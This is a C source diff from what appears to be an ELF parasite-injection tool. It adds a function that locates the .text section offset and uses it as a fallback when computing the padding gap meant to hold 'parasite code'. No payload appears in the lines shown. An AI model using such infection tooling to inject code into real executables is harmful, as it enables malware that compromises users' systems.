@@ -80,6 +80,24 @@ Elf64_Off	PaddingBooster(void *ptr, Elf64_Off padding_size, u_int64_t parasite_f
 	return (padding_size);
 }
 
+u_int64_t  textoff_getter(void *ptr)
+{
+	Elf64_Ehdr	*ehdr		= (Elf64_Ehdr *) ptr;
+
+
+	u_int16_t	shnum			= ehdr->e_shnum;
+	Elf64_Off	sht_offset		= ehdr->e_shoff;
+    Elf64_Shdr	*shdr = (Elf64_Shdr *) (ptr + sht_offset);
+    char *ajustor = ptr + (shdr + ehdr->e_shstrndx)->sh_offset;
+
+	for (int i = 0 ; i < shnum ; ++i)
+	{
+        if (!ft_strcmp((char*)(ajustor + shdr[i].sh_name), ".text"))
+    		return ((size_t)shdr[i].sh_offset);
+	}
+    return (0);
+}
+
 // Returns gap size (accomodation for parasite code in padding between .text segment and next segment 
 // after .text segment) 
 // Also Patch phdr
@@ -106,7 +124,9 @@ Elf64_Off	PaddingSizeFinder(void *ptr)
 			textoff = phdr[i].p_offset;
 			load_textoff = phdr[i].p_vaddr;
 			if (!textoff)
-				printf("LE PTN DE TEXTOFF EST A 0\n");
+				textoff = textoff_getter(ptr);
+			if (!textoff)
+				printf(BOLDRED"<o> "RESET YELLOW"cannot get textoff right\n"RESET);
 
 			// Calculate the offset where the .text segment ends to bellow calculate padding_size 
 			text_segment_end_offset	= phdr[i].p_offset + phdr[i].p_filesz;
